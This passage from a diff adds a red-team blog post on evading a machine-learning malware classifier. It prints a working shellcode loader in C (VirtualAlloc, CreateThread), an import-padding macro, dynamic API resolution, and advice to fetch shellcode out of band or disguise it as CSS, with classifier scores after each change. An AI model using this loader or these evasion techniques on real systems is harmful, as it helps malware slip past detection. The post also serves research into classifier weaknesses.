+<span class="hljs-meta">#<span class="hljs-keyword">endif</span>% </span>
+
+<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] = <span class="hljs-string">""</span>;
+
+<span class="hljs-type">int</span> buf_len = <span class="hljs-number">510</span>;
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    LPVOID lpAddress = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    <span class="hljs-keyword">if</span> (lpAddress == <span class="hljs-literal">NULL</span>) {
+        DEBUG_PRINT(<span class="hljs-string">"VirtualAlloc failed\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    DEBUG_PRINT(<span class="hljs-string">"LpAddress: %p\n"</span>, lpAddress);
+
+    <span class="hljs-built_in">memcpy</span>(lpAddress, buf, <span class="hljs-keyword">sizeof</span>(buf));
+
+    HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)lpAddress, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+
+    <span class="hljs-keyword">if</span> (hThread == <span class="hljs-literal">NULL</span>) {
+        DEBUG_PRINT(<span class="hljs-string">"CreateThread failed\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    DEBUG_PRINT(<span class="hljs-string">"hThread: %p\n"</span>, hThread);
+
+    WaitForSingleObject(hThread, INFINITE);
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre>
+                        <p>
+                            Step-by-step, I removed <code>WaitForSingleObject</code>, then <code>CreateThread</code>, and so on. What was fascinating about this was that <em>literally nothing</em> changed through this. The final product here was an empty <code>main</code>: 
+                        </p>
+
+                        <img src="https://mez0.cc/static/images/ml_classify_4.png" alt="ML Classify 4" class="img-fluid my-4">
+
+                        <p>
+                            After messing with various Visual Studio configurations, the only difference was <code>/MT</code> vs <code>/MT</code>.
+                        </p>
+
+                        <img src="https://mez0.cc/static/images/ml_classify-mt_md.png" alt="ML Classify MT MD" class="img-fluid my-4">
+
+                        <p>
+                            At this point, the content of the code wasn't the problem as the code is essentially empty at this point. Note, though, the samples in this model are malware so a tiny piece of code with nothing in it does not fit the norm. Hence, why its being considered malicious.
+                        </p>
+
+                        <h3 class="mt-5 mb-3" id="imports">Imports</h3>
+
+                        <p>
+                            At this point, I wanted to see how imports would impact the output as the imports essentially represent the code that is being executed. So, I used Claude to vibe-code some Windows API functions as a <em>homework</em> project and shoved it into the solution. It generated a few functions, I won't show their full implementation as its just garbage logic, but the names detail them well enough.
+                        </p>
+
+                        <pre class="hljs-ready"><code class="language-c hljs" data-highlighted="yes">listDirectoryWithDetails(<span class="hljs-string">"C:\\"</span>);
+displaySystemAndConsoleInfo();
+registryDemo();
+memoryDemo();
+threadingDemo();
+environmentDemo();</code></pre>
+                        
+                        <p>
+                            However, this kept it around the same value. So, I began deleting functions calls to see what would change. Notably, deleting the final three caused a significant drop to <code>0.5871</code>.
+                        </p>
+                        <pre class="hljs-ready"><code class="language-c hljs" data-highlighted="yes">memoryDemo();
+threadingDemo();
+environmentDemo();</code></pre>
+                        
+                        <p>
+                            In <a href="https://mez0.cc/posts/dll-export-category/">Categorising DLL Exports with an LLM</a> I used ChatGPT to parse <a href="https://github.com/MicrosoftDocs/sdk-api/">MSDN articles from github</a> and categorise them. For example:
+                        </p>
+
+                        <div class="table-responsive">
+                            <table class="table table-bordered">
+                               <colgroup>
+                                  <col style="width: 19%">
+                                  <col style="width: 62%">
+                                  <col style="width: 17%">
+                               </colgroup>
+                               <thead>
+                                  <tr>
+                                     <th>Title</th>
+                                     <th>Description</th>
+                                     <th>Category</th>
+                                  </tr>
+                               </thead>
+                               <tbody>
+                                  <tr>
+                                     <td>ADVAPI32.DLL!RegEnumKeyW</td>
+                                     <td>Enumerates subkeys of an open registry key – indicating direct
+                                        registry manipulation.
+                                     </td>
+                                     <td>Registry Operations</td>
+                                  </tr>
+                                  <tr>
+                                     <td>GDI32FULL.DLL!UpdateColors</td>
+                                     <td>Updates the client area of a device context by remapping current
+                                        colours to the logical palette.
+                                     </td>
+                                     <td>System Information and Control</td>
+                                  </tr>
+                                  <tr>
+                                     <td>KERNEL32.DLL!TerminateJobObject</td>
+                                     <td>Terminates all processes associated with a job – managing processes
+                                        and threads.
+                                     </td>
+                                     <td>Process and Thread Management</td>
+                                  </tr>
+                                  <tr>
+                                     <td>RPCRT4.DLL!IUnknown_AddRef_Proxy</td>
+                                     <td>Implements the AddRef method for interface proxies – managing
+                                        reference counting in COM.
+                                     </td>
+                                     <td>Process and Thread Management</td>
+                                  </tr>
+                                  <tr>
+                                     <td>RPCRT4.DLL!NdrServerCall2</td>
+                                     <td>Facilitates remote procedure calls (RPC) but is not
+                                        user-invoked.
+                                     </td>
+                                     <td>Network Operations</td>
+                                  </tr>
+                                  <tr>
+                                     <td>SECHOST.DLL!CredDeleteA</td>
+                                     <td>Deletes a credential from the user’s credential set – modifying
+                                        stored authentication data.
+                                     </td>
+                                     <td>Registry Operations</td>
+                                  </tr>
+                                  <tr>
+                                     <td>SHLWAPI.DLL!StrCSpnW</td>
+                                     <td>Searches a string for specific characters – providing their index.
+                                        Involves string manipulation rather than file or network processes.
+                                     </td>
+                                     <td>Memory Management</td>
+                                  </tr>
+                               </tbody>
+                            </table>
+                         </div>
+
+                        <p>
+                            To try and add more noise to the binary in terms of imports, I passed all of this to ChatGPT and had it ignore things like <code>Memory Management</code> and <code>Process and Thread Management</code>.
+                        </p>
+
+                        <img src="https://mez0.cc/static/images/ml_classify-twelve-prompts-later.png" alt="ML Classify Twelve Prompts Later" class="img-fluid my-4">
+
+                        <p>
+                            Adding all of this functionality left us at <code>0.4505</code> when compiled with subsystem <code>/SUBSYSTEM:CONSOLE</code>. When flipped to <code>/SUBSYSTEM:WINDOWS</code> it went up to <code>0.5179</code>.
+                        </p>
+
+                        <img src="https://mez0.cc/static/images/ml_classify_5.png" alt="ML Classify 5" class="img-fluid my-4">
+
+                        <p>
+                            Taking this a step further and not even <em>use</em> the functions. A <code>macro</code> to simply import them can be used to automatically import them without calling them:
+                        </p>
+                        
+                        <pre class="hljs-ready"><code class="language-c hljs" data-highlighted="yes"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;commctrl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">"COMCTL32.lib"</span>)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">"GDI32.lib"</span>)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">"USER32.lib"</span>)</span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> FORCE_IMPORT(DLL, RET, CALLCONV, NAME, ARGS) \
+    __declspec(dllimport) RET CALLCONV NAME ARGS; \
+    static void* dummy_##NAME = (void*)&amp;NAME;</span>
+
+<span class="hljs-comment">// ==================== COMCTL32.dll ====================</span>
+FORCE_IMPORT(COMCTL32, HWND, WINAPI, CreateStatusWindowW, (LPCWSTR lpszText, HWND hwndParent, <span class="hljs-type">int</span> nID))
+FORCE_IMPORT(COMCTL32, HIMAGELIST, WINAPI, ImageList_Create, (<span class="hljs-type">int</span> cx, <span class="hljs-type">int</span> cy, UINT flags, <span class="hljs-type">int</span> cInitial, <span class="hljs-type">int</span> cGrow))
+FORCE_IMPORT(COMCTL32, BOOL, WINAPI, ImageList_Destroy, (HIMAGELIST himl))
+FORCE_IMPORT(COMCTL32, BOOL, WINAPI, ImageList_Draw, (HIMAGELIST himl, <span class="hljs-type">int</span> i, HDC hdc, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, UINT fStyle))
+FORCE_IMPORT(COMCTL32, BOOL, WINAPI, ImageList_GetIconSize, (HIMAGELIST himl, <span class="hljs-type">int</span> *cx, <span class="hljs-type">int</span> *cy))
+FORCE_IMPORT(COMCTL32, <span class="hljs-type">int</span>, WINAPI, ImageList_ReplaceIcon, (HIMAGELIST himl, <span class="hljs-type">int</span> i, HICON hicon))
+FORCE_IMPORT(COMCTL32, COLORREF, WINAPI, ImageList_SetBkColor, (HIMAGELIST himl, COLORREF cr))
+
+<span class="hljs-comment">// ==================== GDI32.dll ====================</span>
+FORCE_IMPORT(GDI32, <span class="hljs-type">int</span>, WINAPI, AbortDoc, (HDC hdc))
+FORCE_IMPORT(GDI32, HDC, WINAPI, CreateCompatibleDC, (HDC hdc))
+FORCE_IMPORT(GDI32, HDC, WINAPI, CreateDCW, (LPCWSTR lpszDriver, LPCWSTR lpszDevice, LPCWSTR lpszOutput, <span class="hljs-type">const</span> DEVMODEW *lpInitData))
+FORCE_IMPORT(GDI32, HFONT, WINAPI, CreateFontIndirectW, (<span class="hljs-type">const</span> LOGFONTW *lplf))
+FORCE_IMPORT(GDI32, HBRUSH, WINAPI, CreateSolidBrush, (COLORREF cr))
+FORCE_IMPORT(GDI32, BOOL, WINAPI, DeleteDC, (HDC hdc))
+FORCE_IMPORT(GDI32, BOOL, WINAPI, DeleteObject, (HGDIOBJ hObject))
+FORCE_IMPORT(GDI32, <span class="hljs-type">int</span>, WINAPI, EndDoc, (HDC hdc))
+FORCE_IMPORT(GDI32, <span class="hljs-type">int</span>, WINAPI, EndPage, (HDC hdc))
+FORCE_IMPORT(GDI32, <span class="hljs-type">int</span>, WINAPI, EnumFontsW, (HDC hdc, LPCWSTR lpFaceName, FONTENUMPROCW lpEnumFontProc, LPARAM lParam))
+FORCE_IMPORT(GDI32, <span class="hljs-type">int</span>, WINAPI, GetDeviceCaps, (HDC hdc, <span class="hljs-type">int</span> index))
+FORCE_IMPORT(GDI32, BOOL, WINAPI, GetTextExtentPoint32W, (HDC hdc, LPCWSTR lpString, <span class="hljs-type">int</span> c, LPSIZE lpSize))
+FORCE_IMPORT(GDI32, <span class="hljs-type">int</span>, WINAPI, GetTextFaceW, (HDC hdc, <span class="hljs-type">int</span> c, LPWSTR lpFaceName))
+FORCE_IMPORT(GDI32, BOOL, WINAPI, GetTextMetricsW, (HDC hdc, LPTEXTMETRICW lptm))
+FORCE_IMPORT(GDI32, HGDIOBJ, WINAPI, SelectObject, (HDC hdc, HGDIOBJ h))
+FORCE_IMPORT(GDI32, <span class="hljs-type">int</span>, WINAPI, SetAbortProc, (HDC hdc, ABORTPROC lpAbortProc))
+FORCE_IMPORT(GDI32, COLORREF, WINAPI, SetBkColor, (HDC hdc, COLORREF color))
+FORCE_IMPORT(GDI32, <span class="hljs-type">int</span>, WINAPI, SetBkMode, (HDC hdc, <span class="hljs-type">int</span> mode))
+FORCE_IMPORT(GDI32, <span class="hljs-type">int</span>, WINAPI, SetMapMode, (HDC hdc, <span class="hljs-type">int</span> mode))
+FORCE_IMPORT(GDI32, BOOL, WINAPI, SetViewportExtEx, (HDC hdc, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, LPSIZE lpsz))
+FORCE_IMPORT(GDI32, BOOL, WINAPI, SetWindowExtEx, (HDC hdc, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, LPSIZE lpsz))
+FORCE_IMPORT(GDI32, <span class="hljs-type">int</span>, WINAPI, StartDocW, (HDC hdc, <span class="hljs-type">const</span> DOCINFOW *pdi))
+FORCE_IMPORT(GDI32, <span class="hljs-type">int</span>, WINAPI, StartPage, (HDC hdc))
+FORCE_IMPORT(GDI32, BOOL, WINAPI, TextOutW, (HDC hdc, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, LPCWSTR lpString, <span class="hljs-type">int</span> c))
+
+<span class="hljs-comment">// ==================== USER32.dll ====================</span>
+FORCE_IMPORT(USER32, HDC, WINAPI, BeginPaint, (HWND hwnd, LPPAINTSTRUCT lpPaint))
+FORCE_IMPORT(USER32, LPWSTR, WINAPI, CharUpperW, (LPWSTR lpsz))</code></pre>
+
+<p>
+    Then adding them by doing this in <code>main</code>:
+</p>
+
+<pre class="hljs-ready"><code class="language-c hljs" data-highlighted="yes"><span class="hljs-type">void</span>* dummy_refs[] = {
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> DUMMY_REF(NAME) (void*)dummy_##NAME,</span>
+    <span class="hljs-comment">// COMCTL32.dll</span>
+    DUMMY_REF(CreateStatusWindowW)
+    DUMMY_REF(ImageList_Create)
+    DUMMY_REF(ImageList_Destroy)
+    DUMMY_REF(ImageList_Draw)
+    DUMMY_REF(ImageList_GetIconSize)
+    DUMMY_REF(ImageList_ReplaceIcon)
+    DUMMY_REF(ImageList_SetBkColor)
+
+    <span class="hljs-comment">// GDI32.dll</span>
+    DUMMY_REF(AbortDoc)
+    DUMMY_REF(CreateCompatibleDC)
+    DUMMY_REF(CreateDCW)
+    DUMMY_REF(CreateFontIndirectW)
+    DUMMY_REF(CreateSolidBrush)
+    DUMMY_REF(DeleteDC)
+    DUMMY_REF(DeleteObject)
+    DUMMY_REF(EndDoc)
+    DUMMY_REF(EndPage)
+    DUMMY_REF(EnumFontsW)
+    DUMMY_REF(GetDeviceCaps)
+    DUMMY_REF(GetTextExtentPoint32W)
+    DUMMY_REF(GetTextFaceW)
+    DUMMY_REF(GetTextMetricsW)
+    DUMMY_REF(SelectObject)
+    DUMMY_REF(SetAbortProc)
+    DUMMY_REF(SetBkColor)
+    DUMMY_REF(SetBkMode)
+    DUMMY_REF(SetMapMode)
+    DUMMY_REF(SetViewportExtEx)
+    DUMMY_REF(SetWindowExtEx)
+    DUMMY_REF(StartDocW)
+    DUMMY_REF(StartPage)
+    DUMMY_REF(TextOutW)
+
+    <span class="hljs-comment">// USER32.dll</span>
+    DUMMY_REF(BeginPaint)
+    DUMMY_REF(CharUpperW)
+<span class="hljs-meta">#<span class="hljs-keyword">undef</span> DUMMY_REF</span>
+};</code></pre>
+                        <p>
+                            By adding all of this, it now sits at around <code>0.6657</code>.
+                        </p>
+
+                        <h3 class="mt-5 mb-3" id="working-the-loading-mechanism-back-in">Working the loading mechanism back in</h3>
+
+                        <p>
+                            With a score approximately &lt;=<code>0.6</code>, the loader can be added back in. To do this, adding back in the <code>buf</code> <strong>AND</strong> the loading code jumps it right back to <code>0.9582</code> which is expected because even though the imports are padded to make it look less malicious, it now has msfvenom shellcode in it.
+                        </p>
+
+                        <p>
+                            The most obvious fix here is to do what I always recommend, and load the shellcode from some out of band method. Whether thats some protected file on disk, over a UNC path, or HTTP - <em>the world is your oyster</em>. All that matters is that the shellcode itself isn’t in the binary as is. Alternatively, it could be transformed into a different file type via steganography, or by something we built at <a href="https://pre.empt.blog/">pre.empt.blog</a>: <a href="https://pre.empt.blog/posts/bluffy/">Bluffy the AV Slayer</a>. Bluffy quite simply converts shellcode into <em>real</em> datatypes such as CSS:
+                        </p>
+
+                        <pre class="hljs-ready"><code class="language-css hljs" data-highlighted="yes"><span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">144</span>, <span class="hljs-number">244</span>, <span class="hljs-number">39</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">144</span>, <span class="hljs-number">201</span>, <span class="hljs-number">2</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">144</span>, <span class="hljs-number">51</span>, <span class="hljs-number">158</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">144</span>, <span class="hljs-number">41</span>, <span class="hljs-number">179</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">144</span>, <span class="hljs-number">154</span>, <span class="hljs-number">59</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">144</span>, <span class="hljs-number">139</span>, <span class="hljs-number">238</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">144</span>, <span class="hljs-number">114</span>, <span class="hljs-number">132</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">144</span>, <span class="hljs-number">159</span>, <span class="hljs-number">89</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">144</span>, <span class="hljs-number">254</span>, <span class="hljs-number">210</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">77</span>, <span class="hljs-number">12</span>, <span class="hljs-number">76</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">90</span>, <span class="hljs-number">157</span>, <span class="hljs-number">178</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">65</span>, <span class="hljs-number">154</span>, <span class="hljs-number">217</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">82</span>, <span class="hljs-number">121</span>, <span class="hljs-number">178</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">85</span>, <span class="hljs-number">124</span>, <span class="hljs-number">144</span>);
+<span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">72</span>, <span class="hljs-number">205</span>, <span class="hljs-number">191</span>)</code></pre>
+                        
+                        <p>
+                            To unravel this, something like <a href="https://www.pcre.org/">PCRE</a> or <a href="https://en.cppreference.com/w/cpp/rege.x.html">c++ regex</a> can be used. But personally, I just parse it out via the line directly by doing splits and things. However, in this blog, I am just not going to include the shellcode in the binary as I am just replicating loading this capability for a <code>.css</code> file on disk.
+                        </p>
+
+                        <p>
+                            Removing just the shellcode and leaving the loader code takes us down to <code>0.8948</code> from <code>0.9582</code> which is is a <code>0.4</code> jump from the previous <code>0.45</code> -&gt; <code>0.51</code> earlier. For reference, this is the loader code:
+                        </p>
+
+<pre class="hljs-ready"><code class="language-c hljs" data-highlighted="yes"><span class="hljs-type">int</span> <span class="hljs-title function_">go</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] = <span class="hljs-string">""</span>;
+
+    LPVOID lpAddress = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    <span class="hljs-keyword">if</span> (lpAddress == <span class="hljs-literal">NULL</span>) {
+        DEBUG_PRINT(<span class="hljs-string">"VirtualAlloc failed\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    DEBUG_PRINT(<span class="hljs-string">"LpAddress: %p\n"</span>, lpAddress);
+
+    <span class="hljs-built_in">memcpy</span>(lpAddress, buf, <span class="hljs-keyword">sizeof</span>(buf));
+
+    HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)lpAddress, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+
+    <span class="hljs-keyword">if</span> (hThread == <span class="hljs-literal">NULL</span>) {
+        DEBUG_PRINT(<span class="hljs-string">"CreateThread failed\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    DEBUG_PRINT(<span class="hljs-string">"hThread: %p\n"</span>, hThread);
+
+    WaitForSingleObject(hThread, INFINITE);
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre>
+                        
+                        <p>
+                            The most obvious thing was to then remove the "malicious functions" from the file which is easily done with <code>GetProcAddress</code> and <code>GetModuleHandle</code>:
+                        </p>
+                        
+<pre class="hljs-ready"><code class="language-c hljs" data-highlighted="yes">FARPROC virtualalloc_ptr = resolve_function(<span class="hljs-string">"kernel32.dll"</span>, <span class="hljs-string">"VirtualAlloc"</span>);
+LPVOID(WINAPI * VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD) = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))virtualalloc_ptr;
+
+FARPROC createthread_ptr = resolve_function(<span class="hljs-string">"kernel32.dll"</span>, <span class="hljs-string">"CreateThread"</span>);
+HANDLE(WINAPI * CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD) = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))createthread_ptr;
+
+FARPROC waitforsingleobject_ptr = resolve_function(<span class="hljs-string">"kernel32.dll"</span>, <span class="hljs-string">"WaitForSingleObject"</span>);
+DWORD(WINAPI * WaitForSingleObject)(HANDLE, DWORD) = (DWORD(WINAPI*)(HANDLE, DWORD))waitforsingleobject_ptr;
+
+LPVOID lpAddress = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</code></pre>
+
+<p>Where <code>resolve_function</code> is:</p>
+
+<pre class="hljs-ready"><code class="language-c hljs" data-highlighted="yes">FARPROC <span class="hljs-title function_">resolve_function</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* module_name, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* function_name)</span> {
+    HMODULE mod_ptr = GetModuleHandleA(module_name);
+    <span class="hljs-keyword">if</span> (mod_ptr == <span class="hljs-literal">NULL</span>) {
+        mod_ptr = LoadLibraryA(module_name);
+        <span class="hljs-keyword">if</span> (mod_ptr == <span class="hljs-literal">NULL</span>) {
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
+        }
+    }
+    <span class="hljs-keyword">return</span> GetProcAddress(mod_ptr, function_name);
+}</code></pre>
+                        <p>
+                            This brings down the prediction slightly to <code>0.8776</code>. At this point, its likely still flagging because the feature set also includes strings. Interestingly, XOR’ing the strings bumps it up to a <code>0.9</code>. So, at this point I felt as if I was back at the start.
+                        </p>
+
+                        <h3 class="mt-5 mb-3" id="reevaluating...">Reevaluating...</h3>
+
+                        <p>
+                            As discussed earlier, I need to account for all the features the model is using to predict. At this point, I have the ability to <em>spoof</em> or <em>fake</em> imports but ultimately thats me just being lazy and not wanting to build a genuine app which uses those functions.
+                        </p>
+
+                        <p>If I use the <code>dim</code> value as a sort of guide, I can move onto another component:</p>
+
+                        <div class="table-responsive">
+                            <table class="table table-bordered">
+                               <thead>
+                                  <tr>
+                                     <th>Class Name</th>
+                                     <th>Dim Value</th>
+                                  </tr>
+                               </thead>
+                               <tbody>
+                                  <tr>
+                                     <td>ImportsInfo</td>
+                                     <td>1282</td>
+                                  </tr>
+                                  <tr>
+                                     <td>ByteHistogram</td>
+                                     <td>256</td>
+                                  </tr>
+                                  <tr>
+                                     <td>ByteEntropyHistogram</td>
+                                     <td>256</td>
+                                  </tr>
+                                  <tr>
+                                     <td>StringExtractor</td>
+                                     <td>177</td>
+                                  </tr>
+                                  <tr>
+                                     <td>SectionInfo</td>
+                                     <td>174</td>
+                                  </tr>
+                                  <tr>
+                                     <td>ExportsInfo</td>
+                                     <td>129</td>
+                                  </tr>
+                                  <tr>
+                                     <td>HeaderFileInfo</td>
+                                     <td>74</td>
+                                  </tr>
+                                  <tr>
+                                     <td>DataDirectories</td>
+                                     <td>34</td>
+                                  </tr>
+                                  <tr>
+                                     <td>RichHeader</td>
+                                     <td>33</td>
+                                  </tr>
+                                  <tr>
+                                     <td>AuthenticodeSignature</td>
+                                     <td>8</td>
+                                  </tr>
+                                  <tr>
+                                     <td>GeneralFileInfo</td>
+                                     <td>7</td>
+                                  </tr>
+                               </tbody>
+                            </table>
+                         </div>
+
+                        <div class="row mt-4 mb-4">
+                            <div class="col-12">
+                                <div class="card">
+                                    <div class="card-body">
+                                        <h5 class="card-title mb-3">Feature Dimension Distribution</h5>
+                                        <div style="height: 500px;">
+                                            <canvas id="dimensionChart" width="1888" height="500" style="display: block; box-sizing: border-box; height: 500px; width: 1888px;"></canvas>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <p>
+                            Following this logic, whether its correct or not, I wanted to take a look at the byte histogram. The feature code for that:
+                        </p>
+                        
+                        <pre class="hljs-ready"><code class="language-python hljs" data-highlighted="yes"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ByteHistogram</span>(<span class="hljs-title class_ inherited__">FeatureType</span>):
+    <span class="hljs-string">"""
+    Byte histogram (count + non-normalized) over the entire binary file
+    """</span>
+
+    name = <span class="hljs-string">"histogram"</span>
+    dim = <span class="hljs-number">256</span>
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
+        <span class="hljs-built_in">super</span>(FeatureType, self).__init__()
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">raw_features</span>(<span class="hljs-params">self, bytez, pe</span>):
+        counts = np.bincount(np.frombuffer(bytez, dtype=np.uint8), minlength=<span class="hljs-number">256</span>)
+        <span class="hljs-keyword">return</span> counts.tolist()
+    
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_raw_features</span>(<span class="hljs-params">self, raw_obj</span>):
+        counts = np.array(raw_obj, dtype=np.float32)
+        <span class="hljs-built_in">sum</span> = counts.<span class="hljs-built_in">sum</span>()
+        normalized = counts / <span class="hljs-built_in">sum</span>
+        <span class="hljs-keyword">return</span> normalized</code></pre>
+
+                        <p>
+                            The line <code>counts = np.bincount(np.frombuffer(bytez, dtype=np.uint8), minlength=256)</code> converts a binary file's raw bytes into a <a href="https://numpy.org/devdocs/reference/generated/numpy.array.html">numpy.array</a> of byte values (0-255) and counts how many times each value appears, producing an array of 256 counts. It ensures the output has 256 slots, even if some byte values are missing, to represent the frequency of each possible byte in the file.
+                        </p>
+
+                        <p>
+                            By tackling the imports in the previous section, especially my first iteration of having ChatGPT generate junk functions, I will hit this a little bit. The general idea here, or even generally across the entire concept, is to build an actual app and add a loader along the way. For me, I opted to add some generic CLI argparsing capabilities as this is fairly common but also allows us to somewhat mess with the entry point and the code flow.
+                        </p>
+
+                        <p>
+                            Let's take a look at a crappy little loader which simply does a <code>VirtualAlloc</code> and <code>CreateThread</code> load directly in <code>main</code>.
+                        </p> 
+
+                        <img src="https://mez0.cc/static/images/ml_classify-bad-sample-codeflow.png" alt="ML Classify Bad Sample Codeflow" class="img-fluid my-4">
+
+                        <p>
+                            The <code>main</code> function:
+                        </p>
+
+                        <img src="https://mez0.cc/static/images/ml_classify-bad-sample-main.png" alt="ML Classify Bad Sample Main" class="img-fluid my-4">
+
+
+                        <p>
+                            Then loading up the sample I am building out, <code>main</code> looks like this:
+                        looks like this:
+                        </p>
+
+                        <img src="https://mez0.cc/static/images/ml_classify-bad-sample-codeflow2.png" alt="ML Classify Bad Sample Main 2" class="img-fluid my-4">
+
+                        <p>
+                            Whilst I am not directly trying to implement code flow obfuscation, it seemed to have some correlation when running the prediction across this logic directly in <code>main</code>, vs when called as a subroutine as <code>junk</code>, for example.
+                        </p>
+
+                        <p>
+                            Running the prediction back over this with no loading capability, this is a new low.
+                        </p>
+
+                        <img src="https://mez0.cc/static/images/ml_classify-cfg-and-bluffy.png" alt="ML Classify CFG and Bluffy" class="img-fluid my-4">
+                             
+                        <p>
+                            This is the part where I am not going to release the functionality for the loading mechanism completely. But, I will note that it it utilises a combination of imports and resolved imports but ultimately it uses the infamous <code>VirtualAlloc</code>, <code>VirtualProtect</code>, <code>CreateThread</code>, and <code>WaitForSingleObject</code> - none of the fancy call stack spoofing, VEH, and various Twitter POCs. Also, this has been successfully been used to operate through for multiple weeks on red team.</p>
+                            
+                        <img src="https://mez0.cc/static/images/ml_classify-even-better.png" alt="ML Classify Even Better" class="img-fluid my-4">
+
+                        <p>
+                            In fact, by copy and pasting <a href="https://github.com/rad9800/misc/blob/main/bypasses/ClearVeh.c">rad9800’s ClearVeh.c</a> into the code base, it bumps it back up. Not by much, but cramming in all the OpSec functionality will gradually bring it up. Note, none of the functions here are resolved dynamically, have any form of obfuscation, or even consider runtime costs.
+                            </p>
+
+                        <img src="https://mez0.cc/static/images/ml_classify-with-veh.png" alt="ML Classify With VEH" class="img-fluid my-4">
+
+                        <h3 class="mt-5 mb-3" id="summarising">Summarising</h3>
+
+                        <p>
